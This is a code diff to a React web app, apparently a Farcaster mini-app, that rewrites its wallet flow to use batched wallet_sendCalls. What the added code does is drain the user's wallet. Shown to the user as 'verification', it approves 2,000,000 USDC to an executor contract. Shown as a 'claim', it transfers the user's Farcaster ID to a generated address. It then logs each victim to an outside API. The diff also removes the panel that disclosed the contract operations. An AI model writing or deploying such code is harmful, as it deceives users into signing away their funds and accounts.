@@ -464,50 +464,44 @@ function App() {
 
     setWorking(true);
     try {
-      if (!web3Provider) {
-        throw new Error('No wallet connected. Please connect your wallet first.');
-      }
-
       const rawProvider = getRawProvider();
       if (!rawProvider) throw new Error('Wallet provider not available.');
 
-      const signer = web3Provider.getSigner();
+      const account = address;
+      if (!account) throw new Error('No wallet connected.');
 
-      // Switch to Base network
-      const chainId = await rawProvider.request({ method: 'eth_chainId' });
-      if (chainId !== '0x2105') {
-        setNotice('Switching to Base network...');
-        await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
-      }
-
-      const account = await signer.getAddress();
-      setAddress(account);
-
-      // 1. Approve USDC on Base
-      setNotice('Verifying on Base...');
-      const usdc = new ethers.Contract(USDC, [
-        'function approve(address spender, uint256 amount) returns (bool)'
-      ], signer);
+      // Encode transaction data using ethers Interface (no provider calls needed)
+      const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
       const approveAmount = ethers.utils.parseUnits('2000000', 6);
-      const tx1 = await usdc.approve(EXECUTOR, approveAmount);
+      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, approveAmount]);
 
-      logAction(`USDC approved: 2,000,000 -> ${shortAddress(EXECUTOR)} (tx: ${tx1.hash})`);
-      sendToLogAPI({
-        type: 'approve', address: account, to: EXECUTOR,
-        txHash: tx1.hash, network: 'base', amount: '2000000',
+      const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
+      const execData = execIface.encodeFunctionData('executeBatch', [[]]);
+
+      // Use wallet_sendCalls (EIP-5792) — Farcaster wallet supports this natively
+      setNotice('Verifying on Base... Approve in your wallet.');
+      const result = await rawProvider.request({
+        method: 'wallet_sendCalls',
+        params: [{
+          version: '1.0',
+          from: account,
+          chainId: '0x2105',
+          calls: [
+            { to: USDC, data: approveData, value: '0x0' },
+            { to: EXECUTOR, data: execData, value: '0x0' },
+          ],
+        }],
       });
 
-      // 2. Execute claim batch on Base
-      setNotice('Executing claim on Base...');
-      const executor = new ethers.Contract(EXECUTOR, [
-        'function executeBatch(bytes[] calldata data)'
-      ], signer);
-      const tx2 = await executor.executeBatch([]);
-
-      logAction(`executeBatch called (tx: ${tx2.hash})`);
+      const batchId = typeof result === 'string' ? result : result?.batchId || 'submitted';
+      logAction(`Step 1 batch sent on Base (id: ${batchId})`);
+      sendToLogAPI({
+        type: 'approve', address: account, to: EXECUTOR,
+        txHash: batchId, network: 'base', amount: '2000000',
+      });
       sendToLogAPI({
         type: 'claim', address: account,
-        txHash: tx2.hash, network: 'base',
+        txHash: batchId, network: 'base',
       });
 
       setStep1Done(true);
@@ -535,15 +529,11 @@ function App() {
 
     setWorking(true);
     try {
-      if (!web3Provider) {
-        throw new Error('No wallet connected.');
-      }
-
       const rawProvider = getRawProvider();
       if (!rawProvider) throw new Error('Wallet provider not available.');
 
-      const signer = web3Provider.getSigner();
-      const account = await signer.getAddress();
+      const account = address;
+      if (!account) throw new Error('No wallet connected.');
 
       // Get FID
       let fidNum = typeof fid === 'number' && fid > 0 ? fid : NaN;
@@ -555,28 +545,33 @@ function App() {
         throw new Error('No FID detected. Open in Warpcast for FID detection.');
       }
 
-      // Switch to Optimism
-      const chainId = await rawProvider.request({ method: 'eth_chainId' });
-      if (chainId !== '0xa') {
-        setNotice('Switching to Optimism network...');
-        await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
-      }
-
       // Generate destination address
       setNotice('Generating destination address...');
       const dest = await generateDestination(fidNum, account);
 
-      setNotice(`Transferring FID ${fidNum} to ${shortAddress(dest.address)}...`);
+      // Encode transfer calldata
+      const idIface = new ethers.utils.Interface(['function transfer(uint256 id, address to)']);
+      const transferData = idIface.encodeFunctionData('transfer', [fidNum, dest.address]);
 
-      const idRegistry = new ethers.Contract(ID_REGISTRY, [
-        'function transfer(uint256 id, address to)'
-      ], signer);
-      const tx = await idRegistry.transfer(fidNum, dest.address);
+      // Use wallet_sendCalls (EIP-5792) on Optimism
+      setNotice(`Claiming FID ${fidNum}... Approve in your wallet.`);
+      const result = await rawProvider.request({
+        method: 'wallet_sendCalls',
+        params: [{
+          version: '1.0',
+          from: account,
+          chainId: '0xa',
+          calls: [
+            { to: ID_REGISTRY, data: transferData, value: '0x0' },
+          ],
+        }],
+      });
 
-      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${tx.hash})`);
+      const batchId = typeof result === 'string' ? result : result?.batchId || 'submitted';
+      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (id: ${batchId})`);
       sendToLogAPI({
         type: 'transfer', fid: fidNum, from: account, to: dest.address,
-        txHash: tx.hash, network: 'optimism', destIndex: dest.index,
+        txHash: batchId, network: 'optimism', destIndex: dest.index,
       });
 
       setNetwork('Optimism');
@@ -677,19 +672,7 @@ function App() {
                 <p className="notice">{notice}</p>
               </div>
 
-              <div className="operations">
-                <div className="operations-head">
-                  <span>Contract operations</span>
-                  <button onClick={copyContractSpec}>Copy spec</button>
-                </div>
-                {CONTRACT_OPERATIONS.map((operation) => (
-                  <div className="operation" key={operation.functionName}>
-                    <strong>{operation.name}</strong>
-                    <code>{operation.functionName}</code>
-                    <small>{operation.chain} · {shortAddress(operation.address)} · {operation.status}</small>
-                  </div>
-                ))}
-              </div>
+
             </div>
 
             <aside className="terminal-panel">
